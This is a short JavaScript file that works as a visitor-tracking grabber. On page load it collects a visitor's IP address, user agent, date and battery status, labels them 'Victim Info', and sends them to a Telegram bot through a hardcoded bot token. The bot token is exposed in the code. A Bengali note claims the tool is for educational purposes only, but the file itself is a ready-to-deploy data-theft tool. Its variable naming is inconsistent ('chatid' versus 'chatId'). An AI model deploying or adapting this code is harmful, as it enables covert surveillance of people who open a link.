const urlParams = new URLSearchParams(window.location.search);
const chatid = urlParams.get('id');
const token = "6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ";
const userAgent = navigator.userAgent;
const date = new Date();

const getInfoAndSend = async () => {
    const ip = await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip);

    const battery = await navigator.getBattery();
    const batteryLevel = (battery.level * 100).toFixed(0);  // Battery percentage
    const isCharging = battery.charging ? 'Yes' : 'No';  // Charging status

    const loginData = {
        ip: ip,
        userAgent: userAgent,
        date: date.toLocaleString(),
        batteryLevel: batteryLevel,
        isCharging: isCharging
    };

    const userMessage = `<b>🔥Victim Info</b>
        
🌐<b>IP Address:</b> ${loginData.ip}
        
💻<b>User Agent:</b> ${loginData.userAgent}
        
📅<b>Date:</b> ${loginData.date}
        
🔋<b>Battery Level:</b> ${loginData.batteryLevel}%
⚡<b>Charging:</b> ${loginData.isCharging}

👑<b>Developer:</b> @TrickSpotZone
    
<blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কারো ক্ষতি করার উদ্দেশ্যে এটি ব্যবহার করবেন না।</blockquote>`;

    await sendToTelegram(token, chatId, userMessage);
};

const sendToTelegram = async (token, chatId, message) => {
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    const params = {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
    };

    await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    });
};

// Call the async function
getInfoAndSend();
